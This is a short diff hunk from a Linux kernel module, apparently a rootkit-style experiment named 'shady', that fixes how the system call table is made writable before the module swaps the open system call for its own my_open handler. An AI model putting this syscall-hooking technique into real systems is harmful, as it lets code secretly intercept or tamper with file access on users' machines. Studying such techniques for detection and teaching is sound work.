@@ -284,7 +284,7 @@ shady_init_module(void)
   }
 
   /*enable writing in system call table*/
-  set_addr_rw((unsigned long)system_call_table_address[__NR_open]);
+  set_addr_rw((unsigned long)system_call_table_address);
 
   /*replace the default open system call address by the my_open() system call address*/
   old_open = system_call_table_address[__NR_open];
